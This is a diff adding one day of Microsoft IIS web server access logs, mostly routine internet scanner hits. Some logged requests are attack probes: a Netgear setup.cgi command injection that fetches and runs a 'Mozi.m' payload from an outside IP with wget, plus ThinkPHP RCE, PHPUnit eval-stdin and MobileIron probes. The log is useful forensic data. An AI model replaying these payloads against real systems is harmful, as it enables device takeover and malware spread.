@@ -1,0 +1,164 @@
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 00:07:01
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 00:07:01 172.21.16.2 GET / - 8080 - 192.241.208.224 Mozilla/5.0+zgrab/0.x - 200 0 0 717
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 00:43:06
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 00:43:06 172.21.16.2 GET / - 8080 - 58.59.90.50 Mozilla/5.0 - 200 0 0 301
+2022-07-20 00:53:14 172.21.16.2 GET /config/getuser index=0 8080 - 45.61.184.119 Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:76.0)+Gecko/20100101+Firefox/76.0 - 404 0 64 217
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 01:36:07
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 01:36:07 172.21.16.2 GET / - 8080 - 192.241.222.177 Mozilla/5.0+zgrab/0.x - 200 0 0 681
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 02:09:55
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 02:09:55 172.21.16.2 GET / - 8080 - 64.62.197.122 - - 200 0 64 615
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 02:34:47
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 02:34:47 172.21.16.2 GET / - 8080 - 8.219.119.144 - - 200 0 64 313
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 02:54:24
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 02:54:24 172.21.16.2 GET / - 8080 - 128.14.134.134 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.113+Safari/537.36 - 200 0 0 628
+2022-07-20 03:09:51 172.21.16.2 GET /setup.cgi next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://180.188.251.89:60762/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 8080 - 180.188.251.89 - - 404 0 2 544
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 04:22:23
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 04:22:23 172.21.16.2 GET / - 8080 - 89.248.163.166 masscan/1.0+(https://github.com/robertdavidgraham/masscan) - 200 0 64 396
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 04:40:13
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 04:40:13 172.21.16.2 GET / - 8080 - 78.108.177.54 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0;++Trident/5.0) - 200 0 64 30232
+2022-07-20 04:40:18 172.21.16.2 GET / - 8080 - 45.125.220.4 Mozilla/5.0+(Windows+NT+10.0;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/51.0.2704.103+Safari/537.36 - 200 0 64 5458
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 05:32:43
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 05:32:43 172.21.16.2 GET / - 8080 - 46.174.191.28 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_7_0)+AppleWebKit/534.30+(KHTML,+like+Gecko)+Chrome/12.0.742.100+Safari/534.30 - 200 0 64 28385
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 06:22:37
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 06:22:37 172.21.16.2 GET /invoker/readonly - 8080 - 103.72.191.210 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:83.0)+Gecko/20100101+Firefox/83.0 - 404 0 2 437
+2022-07-20 06:22:41 172.21.16.2 GET / - 8080 - 103.72.191.210 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:83.0)+Gecko/20100101+Firefox/83.0 - 200 0 0 2411
+2022-07-20 06:22:41 172.21.16.2 GET /script - 8080 - 103.72.191.210 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:83.0)+Gecko/20100101+Firefox/83.0 - 404 0 2 368
+2022-07-20 06:22:42 172.21.16.2 GET /login - 8080 - 103.72.191.210 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:83.0)+Gecko/20100101+Firefox/83.0 - 301 0 0 358
+2022-07-20 06:22:44 172.21.16.2 GET /login/ - 8080 - 103.72.191.210 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:83.0)+Gecko/20100101+Firefox/83.0 http://81.70.29.187:8080/login 200 0 0 952
+2022-07-20 06:22:45 172.21.16.2 GET /jenkins/login - 8080 - 103.72.191.210 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:83.0)+Gecko/20100101+Firefox/83.0 - 404 0 2 366
+2022-07-20 06:22:48 172.21.16.2 GET /manager/html - 8080 - 103.72.191.210 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:83.0)+Gecko/20100101+Firefox/83.0 - 404 0 2 357
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 07:05:03
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 07:05:03 172.21.16.2 GET / - 8080 - 172.104.249.106 Mozilla/5.0 - 200 0 0 911
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 07:32:23
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 07:32:23 172.21.16.2 GET / - 8080 - 128.14.141.34 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.113+Safari/537.36 - 200 0 0 709
+2022-07-20 07:36:54 172.21.16.2 GET / - 8080 - 157.245.64.155 Mozilla/5.0+(compatible;+InternetMeasurement/1.0;++https://internet-measurement.com/) - 200 0 0 2657
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 08:45:06
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 08:45:06 172.21.16.2 GET / - 8080 - 106.75.148.201 - - 200 0 0 692
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 09:28:49
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 09:28:49 172.21.16.2 GET / - 8080 - 69.55.55.155 masscan/1.0+(https://github.com/robertdavidgraham/masscan) - 200 0 64 30286
+2022-07-20 09:36:01 172.21.16.2 GET /config/getuser index=0 8080 - 45.61.184.119 Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:76.0)+Gecko/20100101+Firefox/76.0 - 404 0 2 219
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 11:41:58
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 11:41:58 172.21.16.2 GET / - 8080 - 138.68.76.244 Mozilla/5.0+zgrab/0.x - 200 0 0 3543
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 12:23:34
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 12:23:34 172.21.16.2 GET /manager/html - 8080 - 192.241.129.29 - - 404 0 2 530
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 12:42:36
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 12:42:36 172.21.16.2 GET / - 8080 - 31.132.136.143 Mozilla/5.0+(Windows+NT+5.1;+rv:9.0.1)+Gecko/20100101+Firefox/9.0.1 - 200 0 0 922
+2022-07-20 12:42:36 172.21.16.2 GET /HNAP1/ - 8080 - 31.132.136.143 Mozilla/5.0+(Windows+NT+5.1;+rv:9.0.1)+Gecko/20100101+Firefox/9.0.1 http://81.70.29.187:8080/ 404 0 2 267
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 13:33:32
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 13:33:32 172.21.16.2 GET / - 8080 - 185.173.35.25 NetSystemsResearch+studies+the+availability+of+various+services+across+the+internet.+Our+website+is+netsystemsresearch.com - 200 0 64 30366
+2022-07-20 13:36:40 172.21.16.2 GET / - 8080 - 45.163.159.252 Mozilla/5.0+(Windows+NT+6.1;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/51.0.2704.103+Safari/537.36 - 200 0 0 2513
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 14:02:29
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 14:02:29 172.21.16.2 GET / - 8080 - 78.108.177.51 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0;++Trident/5.0) - 200 0 121 321439
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 15:13:39
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 15:13:39 172.21.16.2 GET / - 8080 - 8.214.87.1 'Mozilla/5.0 - 200 0 0 590
+2022-07-20 15:16:19 172.21.16.2 GET / - 8080 - 8.219.71.118 - - 200 0 64 231
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 15:54:41
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 15:54:41 172.21.16.2 GET /config/getuser index=0 8080 - 45.61.184.119 Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:76.0)+Gecko/20100101+Firefox/76.0 - 404 0 2 291
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 16:12:15
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 16:12:15 172.21.16.2 GET / - 8080 - 8.219.71.118 - - 200 0 64 293
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 17:08:28
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 17:08:28 172.21.16.2 GET / - 8080 - 128.14.133.58 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.113+Safari/537.36 - 200 0 0 709
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 18:16:25
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 18:16:25 172.21.16.2 GET /securityRealm/user/admin/search/index q=a 8080 - 185.7.214.104 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/78.0.3904.108+Safari/537.36 - 404 0 2 1036
+2022-07-20 18:23:53 172.21.16.2 GET / - 8080 - 185.7.214.104 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/78.0.3904.108+Safari/537.36 - 200 0 0 992
+2022-07-20 18:26:09 172.21.16.2 GET /securityRealm/user/admin/search/index q=a 8080 - 59.83.208.108 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/78.0.3904.108+Safari/537.36 - 404 0 2 25
+2022-07-20 18:30:01 172.21.16.2 POST /mifs/.;/services/LogService - 8080 - 185.7.214.104 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/78.0.3904.108+Safari/537.36 http://81.70.29.187:8080 404 0 2 388
+2022-07-20 18:39:06 172.21.16.2 GET / - 8080 - 185.7.214.104 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/78.0.3904.108+Safari/537.36 - 200 0 0 981
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 21:33:29
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 21:33:29 172.21.16.2 GET / - 8080 - 8.219.119.144 - - 200 0 64 314
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 22:09:14
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 22:09:14 172.21.16.2 POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 8080 - 185.7.214.104 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/78.0.3904.108+Safari/537.36 - 404 0 2 496
+2022-07-20 22:23:25 172.21.16.2 GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 8080 - 185.7.214.104 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/78.0.3904.108+Safari/537.36 - 404 0 2 416
+2022-07-20 22:32:55 172.21.16.2 GET / - 8080 - 8.142.37.152 - - 200 0 64 2153
+2022-07-20 22:32:57 172.21.16.2 GET / - 8080 - 8.142.37.152 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_14_6)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/76.0.3809.132+Safari/537.36 - 200 0 0 216
+2022-07-20 22:33:10 172.21.16.2 GET /sitemap.xml - 8080 - 8.142.37.152 fasthttp - 404 0 2 8
+2022-07-20 22:33:10 172.21.16.2 GET /robots.txt - 8080 - 8.142.37.152 fasthttp - 200 0 0 10
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 23:16:54
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 23:16:54 172.21.16.2 GET / - 8080 - 89.29.227.246 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_11_6)+AppleWebKit/601.7.7+(KHTML,+like+Gecko)+Version/9.1.2+Safari/601.7.7 - 200 0 0 1559
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-20 23:37:36
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-20 23:37:36 172.21.16.2 GET / - 8080 - 45.155.126.210 Mozilla/5.0+(compatible;+tchelebi/1.0;++http://tchelebi.io) - 200 0 0 2768
+2022-07-20 23:40:02 172.21.16.2 GET /index.php s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 8080 - 185.7.214.104 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/78.0.3904.108+Safari/537.36 - 200 0 0 893
